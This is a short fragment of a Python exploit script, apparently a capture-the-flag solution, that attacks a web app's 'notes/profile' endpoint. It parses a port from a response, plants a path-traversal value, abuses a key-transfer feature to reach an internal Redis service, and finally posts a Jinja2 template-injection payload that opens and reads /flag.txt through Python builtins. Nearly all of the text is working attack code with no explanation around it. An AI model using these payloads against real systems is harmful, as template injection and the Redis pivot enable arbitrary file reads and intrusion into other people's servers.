...
print(r.text)
port2 = r.text.split("\n")[3].split(" ")[5][:-8]
s.post(HOST + "notes/profile",
       data={"mode": "adddata", "key": uid2, "value": f'../bio/{port1}'})
s.post(HOST + "notes/profile", data={"mode": "keytransfer",
       "host": "redis_users", "port": f"6379", "key": uid2})
...
s2.post(HOST + "notes/profile", data={"mode": "adddata", "key": "bio",
        "value": '{{get_flashed_messages.__globals__.__builtins__.open("/flag.txt").read()}}'})
